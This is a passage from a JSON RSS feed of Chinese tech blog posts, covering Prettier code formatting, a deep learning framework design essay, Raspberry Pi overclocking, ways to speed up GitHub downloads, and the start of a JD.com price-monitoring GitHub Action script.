href=\"http://www.zhihu.com/people/huang-wei-ming-leohuang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">黄伟明</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/470292481/answer/1999413742?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">51 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/446647681?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你们觉得现在《喜羊羊与灰太狼》有可能崛起吗 ？</a><br><a href=\"http://www.zhihu.com/question/265931334?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《喜羊羊与灰太狼》里有什么细思极恐的细节？</a><br>\n","link":"http://www.zhihu.com/question/470292481/answer/1999413742?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"关于深度学习框架的一些自己见解","date":"2021-07-13 13:15:08","description":"\n<p>上次写博客还是10多年前，然后还险些出现了事故，所以就一直没有写了。一晃就10几年过去了，虽然有时候看着一些知乎大咖（前同事等）在消费我们原来做的一些事情，很想回应几句，但是最后也是不了了之。最近团队一位知乎大咖去创业了，所以为了团队的建设，所以决定开始写写自己对于系统领域的一些感悟，也希望通过这个能够让大家更加理解我们团队，以及分享我本人对于系统的一些理解。纯属自己的观点，大家有不同观点，欢迎指正和讨论。</p>\n<p>我一直工作在分布式系统的领域，从大数据到AI工程，其实有不少做系统的我们这行的人，很多都有这个路径，所以第一篇就先聊聊自己一个感悟，说说最近做的深度学习框架，算是开一个头。</p>\n<p>我觉得做深度学习框架其实有两个派别的人，一派是从分布式系统的人来做的，另外一派是从做算法的人来做的。不同的人的背景不同，所以做这个事情的角度也会不同，从而产生不同门派。tensorflow属于系统派，而pytorch属于算法派。像我们这种做系统，特别是做过超大规模分布式系统的人，往往最担心的就是要对一个已经部署在成千上万台的计算集群上的平台软件需要做重大重构，这个中间困难没有做过这个事情的人可能不会太有体感，这么大一个平台，公司不可能财力让你能够去镜像一个集群去做任务的迁移，并且越大公司的平台上用户数众多，业务都会耦合在一起去完成公司的使命，基本上你不可能有时间点可以让全公司的业务团队放下他们自己手头的优先级来配合你做这种迁移，哪怕你工程能力非常强，这种迁移中间不会出现任何意外。何况很复杂系统要做到这一点基本上是很难的。所以我们做系统的，往往会把系统设计得更加具有可扩展性，从而尽最大可能去避免这种大的重构和推倒重来。当我们在面对需要构建一个深度学习框架的时候，我们第一时间就在设想这个框架需要能够从规模上很好支持分布式，能够很好的扩展到任意大的深度模型的框架，我们希望构建一个系统，能够像人脑一样能够把视觉，语音，语言等多种模型能够一同训练。其实这个就是tensorflow这样系统构造的时候的原始想法，把整个计算构成一个Tensor的Flow图。因为分布式本身就很复杂，需要处理各种节点相互的数据和执行中的各种依赖关系。这些事情由人来写代码，太繁琐且容易出错，所以自然地，我们就会设想由系统来负责这种依赖关系。这也就是为什么我们希望整个分布式执行的计划是一个静态图，然后系统再根据用户指定的或者系统智能的决定的placement进行分图，并在这些分图中添加合适的Send-Recv的Op从而构成一个分布式的执行计划。但是这样的设计理念也会带来一些困恼，我们在模型训练时候有时候有些类似控制图的部分，在这种设计理念下，我们必须要把这些控制流图的代码也op化，然后把这些op也整体串联在Tensor的Flow执行图中，大家有兴趣了解细节的话也可以看看我的老朋友也是前同事Yuan Yu写的文章：<a href=\"https://link.zhihu.com/?target=https%3A//arxiv.org/abs/1805.01772\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Dynamic Control Flow in Large-Scale Machine Learning, Eurosys2018.</a>  但是这种方式会使得一些习惯单机开发的研究人员觉得比较晦涩。同时也是因为分布式的原因，我们做系统的很自然会把模型的开发过程分成构图和执行两个阶段。构图的时候只是生成一个逻辑执行计划，然后通过显式方式的提交（或者execute）过程进行执行。这种方式让研究人员觉得不能一边写代码一边就能够马上看到代码片段的结果，所以这也造成很多人诟病TensorFlow的模式不太容易debug自己的模型程序，其实这也是因为分布式带来负担。但是也是因为TensorFlow是静态图的方式，其可以做到训推一体，在训练出来的模型能够导出模型图，并且在这个图上进行系统化的推理优化从而能够非常方便部署到线上。这个系统性化的方法带来另外一个优势。</p>\n<p>框架的另外一派是算法派，特别是感知类模型（图像，语音，语言类）训练，因为这类训练一般都是同步训练，然后“分布式训练”也不像前者那样设想是任意异构的分布式执行图（即每个分布式节点的执行逻辑可以不同），因为是数据并行，这样我们就可以利用MPI的AllReduce的通讯源语来进行梯度的汇集计算。算法同学需要是一种丰富的可扩展的在GPU上能够很好运行的，并且能够很好进行自动梯度的算子库，并且因为面向是数据并行的场景，这样话在神经网络部分其实都是单机程序，从而可以利用任何python的语法糖去构建任何的动态的训练控制逻辑（大家也把这种称作动态图），对于算法研究人员来讲，这种方式写代码比较随性也方便debug，所以在研究界pytorch得到大量的关注和使用。</p>\n<p>刚才说过TensorFlow从设计之初就在考虑可以超大的模型分布式训练的场景，但是没有预想到硬件的发展也非常迅速，显存越来越大以及训练技术的发展，还有非常精细化优化显存的工作，比如DeepSpeed等把optimizer所需要的显存sharding化掉，使得除了超大规模稀疏模型训练外，感知类的SOTA模型一直可以利用数据并行的方式来进行训练。从而使得TensorFlow这种设计理念看上去有overdesign的嫌疑。并且就算超大规模稀疏模型训练，因为TensorFlow整体化的设计理念，不把Parameter Server作为游离在Flow图之外，使得他在超大规模场景下的scalability上出现了问题，从而催生一堆自建PS+深度学习框架的（稀疏）模型训练框架。这是另外一个话题，我会在日后写一写在这个领域上我们一些工作。</p>\n<p>好在随着transformer的出现，我们终于有方法能够回归到最初那个梦想，使得我们可以把多种数据（视觉的，文字的）合在一起训练多模态的模型，因为问题规模的增大，必然需要更多参数的模型来支持，所以我们迅速将模型大小从几十亿增加到万亿规模，这个时候就必然需要能够支持很好模型并行框架，这也是为什么最近这个领域重新变得火热，比如类似OneFlow，MindSpore，PaddlePaddle，Mesh Tensorflow，GShard，以及我们阿里的Whale框架。</p>\n<p>其实从设计理念来看，模型并行正是回归到原来TensorFlow一开始设计时候的设想，只是那个时候因为模型并行的需求不够，没有必要提供比较好高层自动分布式的抽象，写模型的人还是可以自己精细化去构造每个计算节点的子图，整体上TensorFlow的框架只是负责把这些子图能够自动通过Send-Recv进行连接，并且在Runtime能够合法的进行计算。而现在，因为需求增多，算法迭代需求的增多，迫切需要一种高层次的自动分布式框架，从而使得算法同学能够去快速简单构造一个逻辑图的方式去构造自己神经网络，而由系统层来帮助他来进行复杂模型并行的构成。所以其实可以看到TensorFlow的设计理念正好就是为这个考虑的，利用静态图，我们可以逻辑性去描述一个网络训练，然后在执行时候在进行系统化的分图和分布式训练。所以说自动分布式的需求并没有超越原来设计的基本范畴，也是因为这样，我们采取和谷歌Gshard类似技术路线去提供自动分布式的能力。正是站在原有框架基础上去做增量。</p>\n<p>不同于GShard更加关注于谷歌TPU集群，我们关注于异构的GPU集群，这里所说异构是因为我们不如谷歌这么有钱，构建非常大的同构化TPU集群，我们集群中有不同年代的GPU和CPU，这些GPU各自算力和显存都大小不一。也正是因为这样，其实给我们系统提出更大挑战，我们在进行自动分布式时候需要在cost model上考虑好这些差异点。这样才能做到比较优化的分布式训练。这也是我们自动分布式框架Whale一种差异性和核心能力之一。</p>\n<p>其实系统派的框架和算法派的框架也在进行一定的融合，TensorFlow提出了Eager模式，通过TF.function在eager模式下可能单步执行计算，得到Tensor来提高可调式性；而Pytorch通过Trace或者Parse的方式转化为TorchScript的图描述，从而能够更好支持训练到推理的工程化。但是这种动静结合其实只是在一定层次的，比如如果考虑分布式，Trace的方式去得到TorchScript就不足够。需要进一步去限制构图能够使用的API，这也是像NV的megatron以及微软DeepSpeed在Pytorch上去支持分布式所带来的一些约束，感兴趣的可以读读OneFlow的Blog：《<a href=\"https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/IN281OPUEOI12ge3hOvvTw\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">GPT-3难以复现，为什么说PyTorch走上了一条“大弯路”？”》</a></p>\n<p>总结下我的观点：我觉得现在深度学习框架主要流行的两个TensorFlow和Pytorch是有其设计理念的原因的。我们做Whale正是在这种理解的基础上进行路线选择，并且认为应该站在已有的工作基础上去做增量的东西。而不是再去造一个别人做过的轮子。接下来我还陆续展开我们分布式框架Whale，大规模稀疏模型训练工作，编译系统Ansor和DISC，以及我们如何把分布式，编译和调度有机结合方面一系列系统工作，敬请关注。如果大家对于我们PAI团队的工作有兴趣，非常欢迎和我们联系，我的邮箱是weilin.lw@alibaba-inc.com</p>\n<p>PS：写Blog写的不多，还需要多训练，感觉有点虎头蛇尾的，呵呵。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/backom?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">backom</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/375634204?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = 